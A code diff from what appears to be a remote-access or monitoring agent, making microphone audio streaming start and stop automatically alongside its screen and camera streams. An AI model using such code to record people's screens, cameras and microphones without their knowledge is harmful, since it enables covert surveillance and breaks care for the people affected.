@@ -5571,6 +5571,10 @@ def start_streaming(agent_id):
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
         log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
+        
+        # ✅ AUTO-START AUDIO: Start audio streaming with screen stream
+        log_message("🎤 Auto-starting audio streaming with screen stream...")
+        start_audio_streaming(agent_id)
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
@@ -5609,6 +5613,10 @@ def stop_streaming():
         capture_queue = None
         encode_queue = None
         log_message("Stopped video stream.")
+        
+        # ✅ AUTO-STOP AUDIO: Stop audio streaming with screen stream
+        log_message("🎤 Auto-stopping audio streaming with screen stream...")
+        stop_audio_streaming()
 
 def start_audio_streaming(agent_id):
     """Start smart audio streaming that automatically chooses WebRTC or Socket.IO."""
@@ -5705,6 +5713,10 @@ def start_camera_streaming(agent_id):
                 # Use WebRTC camera streaming
                 asyncio.create_task(start_webrtc_camera_streaming(agent_id))
                 log_message("Started WebRTC camera streaming (sub-second latency)")
+                
+                # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+                log_message("🎤 Auto-starting audio streaming with camera stream...")
+                start_audio_streaming(agent_id)
                 return
             except Exception as e:
                 log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
@@ -5712,6 +5724,10 @@ def start_camera_streaming(agent_id):
         # Fallback to Socket.IO
         stream_camera_h264_socketio(agent_id)
         log_message("Started Socket.IO camera stream (fallback mode).")
+        
+        # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+        log_message("🎤 Auto-starting audio streaming with camera stream...")
+        start_audio_streaming(agent_id)
 
 def stop_camera_streaming():
     """Stop modern H.264 camera streaming pipeline."""
@@ -5750,6 +5766,10 @@ def stop_camera_streaming():
         camera_capture_queue = None
         camera_encode_queue = None
         log_message("Stopped camera stream.")
+        
+        # ✅ AUTO-STOP AUDIO: Stop audio streaming with camera stream
+        log_message("🎤 Auto-stopping audio streaming with camera stream...")
+        stop_audio_streaming()
 
 # ========================================================================================
 # WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
